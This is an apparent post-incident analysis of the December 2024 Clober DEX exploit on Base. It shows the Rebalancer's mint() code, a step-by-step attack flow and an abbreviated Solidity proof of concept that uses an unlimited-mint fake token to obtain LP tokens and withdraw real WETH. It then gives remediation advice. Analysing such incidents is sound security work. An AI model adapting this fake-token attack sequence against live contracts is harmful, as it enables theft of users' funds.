# CloberDEX — Fake Token Minting LP Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-12-12 |
| **Protocol** | Clober DEX |
| **Chain** | Base |
| **Loss** | ~501,000 USD (133.7 WETH) |
| **Attacker** | [0x012Fc637](https://basescan.org/address/0x012Fc6377F1c5CCF6e29967Bce52e3629AaA6025) |
| **Attack Tx** | [0x8fcdfcde](https://basescan.org/tx/0x8fcdfcded45100437ff94801090355f2f689941dca75de9a702e01670f361c04) |
| **Vulnerable Contract** | [0x6A0b87D6](https://basescan.org/address/0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895) |
| **Root Cause** | The Rebalancer's `mint()` function did not validate the authenticity of supplied tokens, allowing fake tokens to be used to obtain real LP tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/CloberDEX_exp.sol) |

---
## 1. Vulnerability Overview

The Clober DEX Rebalancer contract (L277) did not verify the authenticity of tokens passed to the `mint()` function when providing liquidity. The attacker deployed a fake token (FakeToken) contract and supplied it to the mint function as if it were a legitimate token, thereby obtaining real LP tokens. The LP tokens were then burned to withdraw real WETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Clober Rebalancer: No token authenticity validation (L277)
contract Rebalancer {
    function mint(
        bytes32 key,
        uint256 amountA,
        uint256 amountB,
        uint256 minLpAmount
    ) external payable returns (uint256 lpAmount) {
        // ❌ No validation that bookKeyA.base, bookKeyA.quote token addresses are registered
        // ❌ Attacker can create a BookKey with fake token addresses
        Currency tokenA = bookKeyA.base;
        Currency tokenB = bookKeyA.quote;

        // Receives fake token transfer
        IERC20(Currency.unwrap(tokenA)).transferFrom(msg.sender, address(this), amountA);
        // ❌ Fake tokens are treated as valid for LP issuance
        lpAmount = calculateLP(amountA, amountB);
        _mint(msg.sender, lpAmount);
    }
}

// ✅ Fix:
// Validate against a whitelist of approved token addresses
// require(approvedTokens[Currency.unwrap(tokenA)], "not approved token");
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Rebalancer.sol
    function mint(bytes32 key, uint256 amountA, uint256 amountB, uint256 minLpAmount)  // ❌ Vulnerability
        external
        payable
        returns (uint256 mintAmount)
    {
        Pool storage pool = _pools[key];
        IBookManager.BookKey memory bookKeyA = bookManager.getBookKey(pool.bookIdA);

        uint256 supply = totalSupply[uint256(key)];
        if (supply == 0) {
            if (amountA == 0 || amountB == 0) revert InvalidAmount();
            // @dev If the decimals > 18, it will revert.
            uint256 complementA =
                bookKeyA.quote.isNative() ? 1 : 10 ** (18 - IERC20Metadata(Currency.unwrap(bookKeyA.quote)).decimals());
            uint256 complementB =
                bookKeyA.base.isNative() ? 1 : 10 ** (18 - IERC20Metadata(Currency.unwrap(bookKeyA.base)).decimals());
            uint256 _amountA = amountA * complementA;
            uint256 _amountB = amountB * complementB;
            mintAmount = _amountA > _amountB ? _amountA : _amountB;
        } else {
            (Liquidity memory liquidityA, Liquidity memory liquidityB) = getLiquidity(key);
            uint256 totalLiquidityA = liquidityA.reserve + liquidityA.claimable + liquidityA.cancelable;
            uint256 totalLiquidityB = liquidityB.reserve + liquidityB.claimable + liquidityB.cancelable;

            if (totalLiquidityA == 0 && totalLiquidityB == 0) {
                mintAmount = amountA = amountB = 0;
            } else if (totalLiquidityA == 0) {
                mintAmount = FixedPointMathLib.mulDivDown(amountB, supply, totalLiquidityB);
                amountA = 0;
            } else if (totalLiquidityB == 0) {
                mintAmount = FixedPointMathLib.mulDivDown(amountA, supply, totalLiquidityA);
                amountB = 0;
            } else {
                uint256 mintA = FixedPointMathLib.mulDivDown(amountA, supply, totalLiquidityA);
                uint256 mintB = FixedPointMathLib.mulDivDown(amountB, supply, totalLiquidityB);
                if (mintA > mintB) {
                    mintAmount = mintB;
                    amountA = FixedPointMathLib.mulDivUp(totalLiquidityA, mintAmount, supply);
                } else {
                    mintAmount = mintA;
                    amountB = FixedPointMathLib.mulDivUp(totalLiquidityB, mintAmount, supply);
                }
            }
        }
        if (mintAmount < minLpAmount) revert Slippage();

        uint256 refund = msg.value;
        if (bookKeyA.quote.isNative()) {
            if (msg.value < amountA) {
                revert InvalidValue();
            } else {
                unchecked {
                    refund -= amountA;
                }
            }
        } else {
            IERC20(Currency.unwrap(bookKeyA.quote)).safeTransferFrom(msg.sender, address(this), amountA);
        }
        if (bookKeyA.base.isNative()) {
            if (msg.value < amountB) {
                revert InvalidValue();
            } else {
                unchecked {
                    refund -= amountB;
                }
            }
        } else {
            IERC20(Currency.unwrap(bookKeyA.base)).safeTransferFrom(msg.sender, address(this), amountB);
        }

        pool.reserveA += amountA;
        pool.reserveB += amountB;

        _mint(msg.sender, uint256(key), mintAmount);
        pool.strategy.mintHook(msg.sender, key, mintAmount, supply);
        emit Mint(msg.sender, key, amountA, amountB, mintAmount);

        if (refund > 0) {
            CurrencyLibrary.NATIVE.transfer(msg.sender, refund);
        }
    }
```

## 3. Attack Flow

```
Attacker (0x012Fc637)
  │
  ├─[1]─▶ Deploy FakeToken contract (0xd3c8d0cd)
  │         → Fake ERC20 with unlimited minting capability
  │
  ├─[2]─▶ Create BookKey based on fake token via Rebalancer.open()
  │         BookKeyA.base = FakeToken
  │         BookKeyA.quote = WETH (or real token)
  │
  ├─[3]─▶ Mint large amount of FakeToken, then call Rebalancer.mint()
  │         ❌ No token authenticity validation → LP tokens obtained
  │
  ├─[4]─▶ Burn LP tokens via Rebalancer.burn()
  │         → Withdraw real WETH
  │
  └─[5]─▶ ~133.7 WETH (~501,000 USD) stolen
```

## 4. PoC Code

```solidity
// Fake token contract
contract FakeToken is ERC20 {
    constructor() ERC20("Fake", "FAKE") {
        _mint(msg.sender, type(uint256).max);  // Unlimited minting
    }
}

// Attack sequence
function attack() external {
    FakeToken fake = new FakeToken();

    // Create BookKey with fake token
    IRebalancer.BookKey memory bookKeyA = IRebalancer.BookKey({
        base: Currency.wrap(address(fake)),
        quote: Currency.wrap(address(WETH)),
        // ...
    });

    bytes32 key = rebalancer.open(bookKeyA, bookKeyB, salt, strategy);

    // ❌ Mint LP with fake token
    fake.approve(address(rebalancer), type(uint256).max);
    uint256 lpAmount = rebalancer.mint(key, fakeAmount, 0, 0);

    // Burn LP → obtain real WETH
    rebalancer.burn(key, lpAmount, 0, 0);
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing token authenticity validation |
| **Attack Vector** | Mint LP with fake tokens, then withdraw real assets |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP** | Business Logic Vulnerability |
| **Severity** | Critical |

## 6. Remediation Recommendations

1. **Token Whitelist**: Require administrator approval for the list of tokens usable in the Rebalancer
2. **BookKey Validation**: Verify that base/quote tokens are on the approved list during `open()`
3. **LP Calculation Validation**: Validate the ratio between actually transferred token amounts and LP issuance quantity
4. **Apply Audit Report**: Vulnerability analyzed by Certik — requires immediate remediation post-audit

## 7. Lessons Learned

- Liquidity provision functions in a DEX must always verify that the supplied token addresses are on a trusted list.
- Fake token attacks are a straightforward vulnerability that can be fully prevented with token input validation alone.
- The $500,000 loss could have been prevented by a single line of token whitelist code.